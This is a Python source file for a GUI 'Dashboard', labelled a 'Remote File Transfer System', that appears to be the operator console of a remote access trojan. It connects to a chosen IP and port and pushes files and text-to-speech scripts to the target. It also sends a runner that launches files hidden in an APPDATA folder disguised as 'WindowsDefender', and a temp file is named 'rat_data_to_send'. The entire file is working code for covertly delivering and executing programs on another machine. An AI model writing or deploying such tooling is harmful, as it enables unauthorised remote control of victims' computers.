import PySimpleGUI as sg

import socket
import tqdm
import os
import sys

SEPARATOR = "<SEPARATOR>"
BUFFER_SIZE = 4096  # send 4096 bytes each time step
port = None
host = None

print("[+] Building GUI")

sg.theme("default1")


def connect(host, port):
    if not host or not port:
        print("[-] Host or port is not set")
        return None
    s = socket.socket()

    print(f"[+] Connecting to {host}:{port}")
    s.connect((host, port))
    print("[+] Connected.")
    return s


def send_file(s, filename):
    filesize = os.path.getsize(filename)
    s.send(f"{filename}{SEPARATOR}{filesize}".encode())

    # start sending the file
    progress = tqdm.tqdm(
        range(filesize),
        f"Sending {filename}",
        unit="B",
        unit_scale=True,
        unit_divisor=1024,
    )
    with open(filename, "rb") as f:
        while True:
            # read the bytes from the file
            bytes_read = f.read(BUFFER_SIZE)
            if not bytes_read:
                # file transmitting is done
                break
            # we use sendall to assure transimission in
            # busy networks
            s.sendall(bytes_read)
            # update the progress bar
            progress.update(len(bytes_read))
    s.close()


def send_data(s, data: bytes, name: str):
    size = sys.getsizeof(data)
    s.send(f"{name}{SEPARATOR}{size}".encode())

    # start sending the file
    progress = tqdm.tqdm(
        range(size), f"Sending {name}", unit="B", unit_scale=True, unit_divisor=1024
    )
    with open(os.path.join(os.getenv("Temp"), "rat_data_to_send"), "wb") as f:
        f.write(data)
    with open(os.path.join(os.getenv("Temp"), "rat_data_to_send"), "rb") as f:
        while True:
            # read the bytes from the file
            bytes_read = f.read(BUFFER_SIZE)
            if not bytes_read:
                # file transmitting is done
                break
            # we use sendall to assure transimission in
            # busy networks
            s.sendall(bytes_read)
            # update the progress bar
            progress.update(len(bytes_read))
    s.close()


def send_tts(tts_text):
    s = connect(host, port)
    if not s:
        return
    tts = f"""from gtts import gTTS
import pygame

text = {tts_text}
# generate tts
pygame.init()
pygame.mixer.init()
output = gTTS(text=text, lang="en", tld="co.in")
output.save(f"tts.mp3")

   

pygame.mixer.music.load("tts.mp3")
pygame.mixer.music.play()
pygame.mixer.music.set_volume(1)

while pygame.mixer.music.get_busy():
   ...
"""
    send_data(s, tts.encode(), "tts.py")
    s.close()


def send_runner_code(filename):
    print(host, port)
    s = connect(host, port)
    if not s:
        return
    runner = f"""import os
os.startfile(os.path.join(os.path.join(os.getenv('APPDATA'), "WindowsDefender"), "{filename}"))
"""
    send_data(s, runner.encode(), "runner.py")
    s.close()


def main():
    global host, port
    layout_tts = [
        [sg.Text("Wirte your text here: "), sg.InputText(key="tts_text")],
        [sg.Button("Send TTS", key="send_tts")],
    ]

    layout_send = [
        [
            sg.Text("Choose a file to send: "),
            sg.Input(key="file_path"),
            sg.FileBrowse(),
        ],
        [sg.Button("Send File", key="send_file")],
    ]
    layout_run = [
        [sg.Text("Enter the file name: "), sg.InputText(key="file_name")],
        [
            sg.Button(
                "Run Remote File",
                key="run_file",
            )
        ],
    ]
    layout_home = [
        [sg.Text("Welcome to the Remote File Transfer System")],
        [sg.Text("Enter the IP address: "), sg.InputText(key="ip", enable_events=True)],
        [sg.Text("Enter the port: "), sg.InputText(key="port", enable_events=True)],
        [
            sg.Button("send tts"),
            sg.Button("send files"),
            sg.Button("send files to run"),
        ],
    ]

    layout = [
        [
            sg.Column(layout_home, key="home"),
            sg.Column(layout_tts, visible=False, key="tts"),
            sg.Column(layout_send, visible=False, key="files"),
            sg.Column(layout_run, visible=False, key="run"),
        ],
        [sg.Button("Home")],
    ]
    layout_type = "home"
    window = sg.Window("Dashboard", layout)

    print("[+] Starting GUI")

    while True:
        event, values = window.read()
        if event == "Exit" or event == sg.WIN_CLOSED:
            print("[+] Exiting")
            break
        if event.lower() in ("send tts", "send files", "send files to run", "home"):
            window[layout_type].update(visible=False)
            layout_type = event.split(" ")[-1].lower()
            window[layout_type].update(visible=True)
        elif event in ("send_tts", "send_file", "run_file"):
            if event == "send_tts":
                text = values["tts_text"]
                send_tts(text)
            elif event == "send_file":
                path = values["file_path"]
                s = connect(host, port)
                if not s:
                    continue
                send_file(s, path)
                s.close()
            elif event == "run_file":
                filename = values["file_name"]
                send_runner_code(filename)
        elif event == "ip" or event == "port":
            host = values["ip"]
            if values["port"].isdigit():
                port = int(values["port"])


if __name__ == "__main__":
    main()
